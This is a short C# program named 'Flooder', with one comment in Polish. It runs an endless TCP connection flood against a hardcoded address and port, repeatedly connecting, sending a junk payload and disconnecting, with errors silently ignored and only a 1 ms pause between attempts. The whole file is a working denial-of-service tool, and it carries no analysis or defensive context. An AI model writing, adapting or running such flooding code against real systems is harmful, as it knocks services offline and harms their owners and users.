using System;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading;

namespace Flooder
{
    class Program
    {
        static void Main(string[] args)
        {
            IPAddress targetIp = IPAddress.Parse("192.168.1.77");
            int targetPort = 5000;

            Console.WriteLine("TCP Flood started...");
            Console.WriteLine($"Target: {targetIp}:{targetPort}");

            // Prosty payload (nie ma znaczenia co wysyłamy)
            byte[] payload = Encoding.ASCII.GetBytes("FLOOD_DATA");

            while (true)
            {
                try
                {
                    TcpClient client = new TcpClient();
                    client.SendTimeout = 100;
                    client.ReceiveTimeout = 100;

                    client.Connect(targetIp, targetPort);

                    NetworkStream stream = client.GetStream();

                    stream.Write(payload, 0, payload.Length);
                    client.Close();
                }
                catch
                {
                }
                Thread.Sleep(1);
            }
        }
    }
}
